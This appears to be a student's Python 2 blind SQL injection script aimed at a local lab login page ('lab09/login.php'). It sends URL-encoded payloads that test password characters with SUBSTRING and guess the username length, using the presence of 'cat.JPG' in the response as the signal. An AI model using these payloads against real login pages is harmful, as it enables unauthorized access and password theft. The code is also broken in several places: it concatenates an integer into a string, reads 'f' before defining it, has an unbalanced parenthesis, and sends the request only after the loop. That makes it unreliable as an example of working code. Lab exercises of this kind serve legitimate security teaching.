import subprocess
import urllib


# request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
# request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
#bashCommand = "echo 'hello' "
# subprocess.call(['wget','-q','-O','index.html',request])
#output, error = process.communicate()
#print output
#print error
#print bashCommand



################################# Loop to get field's size

for x in xrange(0,25):
	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(username)%20=%20" + x + "--%20"
	response = f.read()
	if (response.find('cat.JPG')!=-1: 
		print "found size : %s" %x

f = urllib.urlopen(request)
print "1" + f.geturl()
print "2" + f.read()